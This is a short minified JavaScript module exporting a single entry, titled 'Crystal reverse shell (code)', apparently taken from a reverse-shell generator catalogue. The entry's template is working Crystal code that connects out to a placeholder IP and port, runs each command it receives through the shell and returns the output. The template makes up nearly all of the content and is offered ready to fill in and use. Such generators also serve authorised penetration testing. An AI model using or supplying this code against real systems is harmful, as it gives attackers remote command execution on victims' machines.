const e=[{title:"Crystal reverse shell (code)",template:`require "process"
require "socket"

c = Socket.tcp(Socket::Family::INET)
c.connect("{ip}", {port})
loop do 
  m, l = c.receive
  p = Process.new(m.rstrip("\\n"), output:Process::Redirect::Pipe, shell:true)
  c << p.output.gets_to_end
end`,description:"Crystal reverse shell script with socket connection and process execution."}],t={commands:e};export{e as commands,t as default};
